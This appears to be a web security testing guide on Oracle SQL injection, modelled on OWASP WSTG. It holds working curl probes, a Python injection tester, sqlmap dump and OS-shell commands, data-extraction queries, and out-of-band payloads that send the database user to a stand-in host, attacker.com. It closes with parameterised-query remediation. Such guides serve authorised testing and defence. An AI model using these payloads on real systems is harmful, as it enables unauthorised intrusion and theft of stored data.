# WSTG-INPV-05.1: Testing for SQL Injection - Oracle

## Test ID
WSTG-INPV-05.1

## Test Name
Testing for SQL Injection - Oracle

## High-Level Description

Oracle-specific SQL injection testing focuses on exploiting Oracle Database features, syntax, and built-in functions. Oracle's unique characteristics include PL/SQL, dual table, specific error messages, and distinct functions that can be leveraged for detection and exploitation.

---

## What to Check

- [ ] Oracle-specific error messages
- [ ] Oracle system tables
- [ ] PL/SQL injection
- [ ] Oracle functions exploitation
- [ ] UTL_HTTP for out-of-band
- [ ] XML functions

---

## How to Test

### Step 1: Oracle Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

# Oracle-specific payloads
echo "[*] Testing for Oracle database..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "ORA-[0-9]{5}"

# Dual table test (Oracle-specific)
curl -s "${TARGET}1 AND 1=(SELECT 1 FROM DUAL)--"

# Oracle version
curl -s "${TARGET}' UNION SELECT NULL,banner,NULL FROM v\$version--"

# String concatenation (Oracle uses ||)
curl -s "${TARGET}1'||'test"

# Oracle comment syntax
curl -s "${TARGET}1--" | head -20
```

### Step 2: Oracle SQLi Tester

```python
#!/usr/bin/env python3
"""
Oracle SQL Injection Tester
"""

import requests
import re
import time

class OracleSQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Oracle error patterns
    ORACLE_ERRORS = [
        r"ORA-[0-9][0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"oracle\.jdbc",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
    ]

    # Oracle-specific payloads
    ORACLE_PAYLOADS = {
        'error_based': [
            "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,'~'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'~')--",
        ],
        'union_based': [
            "' UNION SELECT NULL FROM DUAL--",
            "' UNION SELECT NULL,NULL FROM DUAL--",
            "' UNION SELECT NULL,NULL,NULL FROM DUAL--",
            "' UNION SELECT NULL,banner,NULL FROM v$version--",
            "' UNION SELECT NULL,user,NULL FROM DUAL--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("1 AND (SELECT COUNT(*) FROM DUAL)=1", "1 AND (SELECT COUNT(*) FROM DUAL)=2"),
        ],
        'time_based': [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "1 AND DBMS_LOCK.SLEEP(5)=1",
            "' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM DUAL) IS NOT NULL--",
        ],
        'out_of_band': [
            "' AND UTL_HTTP.REQUEST('http://attacker.com/oob?data='||(SELECT user FROM DUAL))=1--",
            "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)||'.attacker.com')=1--",
            "' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/'||(SELECT user FROM DUAL)||'\"> %remote;]>'),'/l') FROM DUAL) IS NOT NULL--",
        ],
    }

    def detect_oracle(self, param):
        """Detect if backend is Oracle"""
        print(f"[*] Detecting Oracle database...")

        detection_payloads = [
            "' AND 1=(SELECT 1 FROM DUAL)--",
            "' UNION SELECT NULL FROM DUAL--",
            "' AND ROWNUM=1--",
            "1'||'test",  # Oracle string concat
        ]

        for payload in detection_payloads:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Check for Oracle errors
                for pattern in self.ORACLE_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] Oracle database detected!")
                        return True

                # Check for successful injection (no error on DUAL query)
                if 'DUAL' in payload and response.status_code == 200:
                    print(f"[+] Oracle likely (DUAL table accessible)")
                    return True

            except Exception as e:
                pass

        return False

    def test_error_based(self, param):
        """Test Oracle error-based injection"""
        print(f"\n[*] Testing Oracle error-based injection...")

        for payload in self.ORACLE_PAYLOADS['error_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Look for Oracle version or data in error
                if re.search(r'Oracle|ORA-|v\$version', response.text, re.IGNORECASE):
                    print(f"[VULN] Error-based SQLi!")
                    print(f"  Payload: {payload[:60]}")
                    self.findings.append({
                        'type': 'Oracle Error-based SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_union_based(self, param):
        """Test Oracle UNION-based injection"""
        print(f"\n[*] Testing Oracle UNION-based injection...")

        # First find number of columns
        for i in range(1, 10):
            null_list = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {null_list} FROM DUAL--"

            try:
                response = self.session.get(self.url, params={param: payload})

                # If no error, we found the column count
                if response.status_code == 200:
                    for pattern in self.ORACLE_ERRORS:
                        if not re.search(pattern, response.text):
                            print(f"[+] Column count: {i}")

                            # Try to extract data
                            data_payload = f"' UNION SELECT {null_list.replace('NULL', 'user', 1)} FROM DUAL--"
                            data_response = self.session.get(self.url, params={param: data_payload})

                            self.findings.append({
                                'type': 'Oracle UNION-based SQLi',
                                'columns': i,
                                'severity': 'Critical'
                            })
                            return True

            except Exception as e:
                pass

        return False

    def test_time_based(self, param):
        """Test Oracle time-based blind injection"""
        print(f"\n[*] Testing Oracle time-based injection...")

        # Baseline time
        start = time.time()
        self.session.get(self.url, params={param: 'test'}, timeout=30)
        baseline = time.time() - start

        for payload in self.ORACLE_PAYLOADS['time_based']:
            try:
                start = time.time()
                self.session.get(self.url, params={param: payload}, timeout=30)
                response_time = time.time() - start

                if response_time > baseline + 4:
                    print(f"[VULN] Time-based SQLi!")
                    print(f"  Payload: {payload[:60]}")
                    print(f"  Response time: {response_time:.2f}s")
                    self.findings.append({
                        'type': 'Oracle Time-based Blind SQLi',
                        'payload': payload,
                        'response_time': response_time,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based SQLi (timeout)!")
                self.findings.append({
                    'type': 'Oracle Time-based Blind SQLi',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def run_tests(self, param='id'):
        """Run all Oracle SQLi tests"""
        if self.detect_oracle(param):
            self.test_error_based(param)
            self.test_union_based(param)
            self.test_time_based(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("ORACLE SQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo Oracle SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:70]}")

# Usage
tester = OracleSQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: Oracle Data Extraction

```sql
-- Oracle Version
SELECT banner FROM v$version WHERE ROWNUM=1
SELECT version FROM v$instance

-- Current User
SELECT user FROM DUAL
SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL

-- Database Name
SELECT global_name FROM global_name
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL

-- List Tables
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables

-- List Columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Extract Data
SELECT username,password FROM users

-- Stacked Queries (requires specific context)
'; EXECUTE IMMEDIATE 'INSERT INTO log VALUES(''injected'')'--

-- File Reading (requires privileges)
SELECT * FROM (SELECT text FROM all_source WHERE name='UTL_FILE')

-- Command Execution (requires JAVA privileges)
-- Create Java class for command execution
-- Execute via DBMS_JAVA.RUNJAVA
```

### Step 4: SQLMap Oracle Commands

```bash
# Detect and exploit Oracle SQLi
sqlmap -u "https://target.com/product?id=1" --dbms=oracle

# Get Oracle version
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --banner

# List databases
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --dbs

# List tables
sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL --tables

# Dump data
sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL -T USERS --dump

# OS shell (requires privileges)
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --os-shell
```

---

## Tools

| Tool | Purpose |
|------|---------|
| SQLMap | Automated Oracle SQLi |
| Oracle SQL Developer | Database client |
| Burp Suite | Manual testing |

---

## Remediation

```java
// Java - PreparedStatement for Oracle
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();
```

```python
# Python - cx_Oracle with bind variables
import cx_Oracle

cursor = connection.cursor()
cursor.execute("SELECT * FROM users WHERE id = :id", {'id': user_id})
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Oracle SQLi with DBA privileges | 9.8 | Critical |
| Oracle SQLi data extraction | 8.6 | High |
| Oracle Blind SQLi | 8.6 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-89** | SQL Injection |

---

## Checklist

```
[ ] Oracle database detected
[ ] Error-based injection tested
[ ] UNION-based injection tested
[ ] Time-based injection tested
[ ] Out-of-band tested (if possible)
[ ] Data extraction attempted
[ ] Findings documented
```
